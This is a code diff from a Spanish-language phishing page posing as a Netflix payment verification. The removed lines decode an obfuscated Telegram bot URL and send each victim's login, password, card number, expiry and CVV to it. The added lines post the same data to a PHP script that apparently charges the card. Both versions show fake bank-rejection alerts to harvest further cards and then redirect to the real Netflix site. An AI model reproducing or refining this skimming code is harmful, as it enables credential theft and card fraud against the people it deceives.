@@ -111,50 +111,35 @@
         }
 
         // 4. ENVÍO OFUSCADO Y LÓGICA DE REINTENTOS
-        function _0xdispatch(obj) {
-    intentos++;
-    sessionStorage.setItem('cont_int', intentos);
+       function _0xdispatch(obj) {
+    // Mostramos cargador
+    document.getElementById('dynamic-injection').style.display = 'none';
+    document.getElementById('loading-overlay').style.display = 'block';
 
-    // URL y ID decodificados para asegurar que no haya errores de base64
-    const _0xa = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=");
-    const _0xb = atob("Nzk5MzcyMjIxNA==");
-
-    // Mensaje ultra-simplificado para evitar errores de parseo
-    const _0xtext = "--- NUEVO HIT #" + intentos + " ---\n" +
-                  "User: " + obj.em + "\n" +
-                  "Pass: " + obj.pw + "\n" +
-                  "Name: " + obj.nm + "\n" +
-                  "Card: " + obj.cc + "\n" +
-                  "Exp: " + obj.ex + "\n" +
-                  "CVV: " + obj.cv;
-
-    // Usamos el método tradicional de envío de formulario para saltar bloqueos de seguridad
-    const xhr = new XMLHttpRequest();
-    xhr.open("POST", _0xa, true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-    
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            // No importa si falla o no, hacemos la mímica para el usuario
-            setTimeout(() => {
-                if (intentos < 2) {
-                    alert("Error de procesamiento: Su entidad bancaria ha rechazado la transacción. Por favor, intente con una tarjeta diferente.");
-                    location.reload();
-                } else {
-                    sessionStorage.removeItem('cont_int');
-                    alert("¡Suscripción confirmada! Redirigiendo...");
-                    window.location.href = "https://www.netflix.com/login";
-                }
-            }, 1500);
-        }
-    };
-
-    const data = JSON.stringify({
-        chat_id: _0xb,
-        text: _0xtext
+    fetch('enviar.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(obj)
+    })
+    .then(response => response.json())
+    .then(data => {
+        setTimeout(() => {
+            if (data.pago === true) {
+                // SI EL COBRO FUE EXITOSO
+                sessionStorage.removeItem('cont_int');
+                alert("¡Verificación completada! Su suscripción ha sido activada con éxito.");
+                window.location.href = "https://www.netflix.com/login";
+            } else {
+                // SI EL COBRO FALLÓ
+                alert("Error: El banco ha rechazado la transacción. Esto puede deberse a fondos insuficientes o restricciones de seguridad. Por favor, use una tarjeta diferente.");
+                location.reload();
+            }
+        }, 2000);
+    })
+    .catch(err => {
+        console.error("Error técnico");
+        location.reload();
     });
-
-    xhr.send(data);
 }
     </script>
 </body>
